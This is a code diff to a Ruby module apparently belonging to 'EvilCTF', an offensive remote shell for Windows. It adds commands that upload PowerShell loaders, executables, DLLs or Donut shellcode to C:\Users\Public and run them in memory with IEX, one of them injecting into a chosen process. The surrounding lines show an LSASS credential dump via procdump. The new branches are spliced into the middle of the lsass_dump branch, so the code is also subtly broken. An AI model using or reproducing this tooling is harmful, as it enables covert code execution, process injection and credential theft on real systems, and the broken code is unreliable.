@@ -244,6 +244,68 @@ module EvilCTF::Session
               next
 
             when /^lsass_dump$/i
+                      # In-memory loader commands
+                      when /^invoke-binary\s+(.+)$/i
+                        args = $1.strip
+                        loader_local = File.expand_path('../../../tools/loaders/Invoke-Binary.ps1', __FILE__)
+                        loader_remote = 'C:\\Users\\Public\\Invoke-Binary.ps1'
+                        unless shell.run("Test-Path '#{loader_remote}'").output.strip == 'True'
+                          puts "[*] Uploading Invoke-Binary.ps1 loader..."
+                          EvilCTF::Uploader.upload_file(loader_local, loader_remote, shell)
+                        end
+                        exe, *exe_args = args.split(/\s+/, 2)
+                        exe_args = exe_args.join(' ')
+                        if File.exist?(exe)
+                          remote_exe = "C:\\Users\\Public\\#{File.basename(exe)}"
+                          puts "[*] Uploading #{exe} to #{remote_exe}..."
+                          EvilCTF::Uploader.upload_file(exe, remote_exe, shell)
+                          exe = remote_exe
+                        end
+                        ps = "IEX (Get-Content '#{loader_remote}' -Raw); Invoke-Binary -Path '#{exe}'"
+                        ps += " -Arguments '#{exe_args}'" unless exe_args.empty?
+                        result = shell.run(ps)
+                        puts result.output
+                        next
+
+                      when /^dll-loader\s+(.+)$/i
+                        args = $1.strip
+                        loader_local = File.expand_path('../../../tools/loaders/Dll-Loader.ps1', __FILE__)
+                        loader_remote = 'C:\\Users\\Public\\Dll-Loader.ps1'
+                        unless shell.run("Test-Path '#{loader_remote}'").output.strip == 'True'
+                          puts "[*] Uploading Dll-Loader.ps1 loader..."
+                          EvilCTF::Uploader.upload_file(loader_local, loader_remote, shell)
+                        end
+                        dll = args
+                        if File.exist?(dll)
+                          remote_dll = "C:\\Users\\Public\\#{File.basename(dll)}"
+                          puts "[*] Uploading #{dll} to #{remote_dll}..."
+                          EvilCTF::Uploader.upload_file(dll, remote_dll, shell)
+                          dll = remote_dll
+                        end
+                        ps = "IEX (Get-Content '#{loader_remote}' -Raw); Dll-Loader -Path '#{dll}'"
+                        result = shell.run(ps)
+                        puts result.output
+                        next
+
+                      when /^donut-loader\s+(.+)$/i
+                        args = $1.strip
+                        loader_local = File.expand_path('../../../tools/loaders/Donut-Loader.ps1', __FILE__)
+                        loader_remote = 'C:\\Users\\Public\\Donut-Loader.ps1'
+                        unless shell.run("Test-Path '#{loader_remote}'").output.strip == 'True'
+                          puts "[*] Uploading Donut-Loader.ps1 loader..."
+                          EvilCTF::Uploader.upload_file(loader_local, loader_remote, shell)
+                        end
+                        donutfile, processid = args.split(/\s+/, 2)
+                        if File.exist?(donutfile)
+                          remote_donut = "C:\\Users\\Public\\#{File.basename(donutfile)}"
+                          puts "[*] Uploading #{donutfile} to #{remote_donut}..."
+                          EvilCTF::Uploader.upload_file(donutfile, remote_donut, shell)
+                          donutfile = remote_donut
+                        end
+                        ps = "IEX (Get-Content '#{loader_remote}' -Raw); Donut-Loader -DonutFile '#{donutfile}' -ProcessId #{processid}"
+                        result = shell.run(ps)
+                        puts result.output
+                        next
               EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
               command_manager.expand_macro('lsass_dump', shell,
                                            webhook: session_options[:webhook])
